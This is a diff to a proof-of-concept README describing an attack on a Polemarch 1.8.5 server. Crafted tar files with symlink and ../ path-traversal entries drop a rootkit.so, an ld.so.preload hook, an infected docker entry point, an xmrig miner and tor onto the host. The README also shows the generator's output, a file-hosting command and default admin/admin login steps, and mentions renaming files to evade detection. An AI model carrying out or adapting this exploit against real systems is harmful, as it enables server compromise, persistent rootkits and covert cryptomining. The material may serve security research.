@@ -24,15 +24,16 @@ and based on the work from https://www.trellix.com/en-us/about/newsroom/stories/
 
 ### Directories to attack
 We want to be able to deploy the following files:
+
 - /usr/local/lib
-  -> rootkit.so: library to load
+  - -> **rootkit.so**: library to load
 - /etc
-  -> ld.so.preload: library to load before any other library
+  - -> **ld.so.preload**: library to load before any other library
 - /opt/polemarch/bin
-  -> polemarchctl: entry point for docker
+  - -> **polemarchctl**: infected docker entry point
 - /usr/bin
-  -> xmring: miner
-  -> tor: tor
+  - -> **xmring**: miner
+  - -> **tor**: tor
 
 Note: in the real exploit we would change some names to avoid detection.
 
@@ -46,28 +47,42 @@ In order to deploy the malware we will have to set up:
 
 - Polemarch server 
 - Server hosting the compromised tar files
-- Nc listening to execute a reverse shell
 
-First, deploy the polemarch server:
-
-```bash
-$: ./polemarch.sh 
-+ docker rm polemarch -f
-polemarch
-+ docker run -d --name polemarch --restart always -v /opt/polemarch/projects:/projects -v /opt/polemarch/hooks:/hooks -p 8080:8080 vstconsulting/polemarch:1.8.5
-fbbbd334a21694e760522172519d51e253f1d2bebb35f5b15a01a1b0b96fb518
-```
+First, deploy the polemarch server (with vagrant or docker):
 
 Generate the tar files and host the tar files (example using python localhost server). Configure the server to listen in an interface
 accesible from the docker container:
 
 ```bash
 $: cd poc
-$: python tar.py
-+ set -o pipefail
-+ python3 tar.py
-+ python3 -m http.server --bind 172.17.0.1 3000
-Serving HTTP on 172.17.0.1 port 3000 (http://172.17.0.1:3000/) ...
+
+# Copy tor and xmrig binaries
+$: cp ../cryptominer/tor .
+$: cp ../cryptominer/xmrig .
+
+# Execute tar files generator
+$: python3 tar.py
+[*] Creating symlink aaaa -> etc/
+[*] Creating symlink bbbb -> usr/local/lib/
+[*] Creating symlink cccc -> usr/bin/
+[*] Creating symlink dddd -> opt/polemarch/bin/
+[*] Changing aaaa to ../../../../../../../../../test/aaaa
+[*] Changing bbbb to ../../../../../../../../../test/bbbb
+[*] Changing cccc to ../../../../../../../../../test/cccc
+[*] Changing dddd to ../../../../../../../../../test/dddd
+[*] Changing ld.so.preload to ../../../../../../../../../test/aaaa/ld.so.preload
+[*] Changing rootkit.so to ../../../../../../../../../test/bbbb/rootkit.so
+[*] Changing tor to ../../../../../../../../../test/cccc/tor
+[*] Changing xmrig to ../../../../../../../../../test/cccc/xmrig
+[*] Changing polemarchctl to ../../../../../../../../../test/dddd/polemarchctl
+[*] Removing symlink aaaa
+[*] Removing symlink bbbb
+[*] Removing symlink cccc
+[*] Removing symlink dddd
+
+# Server python server from tar directory
+$: cd tar
+$: python -m http.server 3005
 ```
 
 Log in to the polemarch server using default password (admin/admin) and
@@ -77,3 +92,4 @@ create a project with a the compromised tar file:
 
 "Sync" the project, which will untar untar our compromised tar.
 
+Note: the server hosting IP must be accessible from the docker of virtual machine
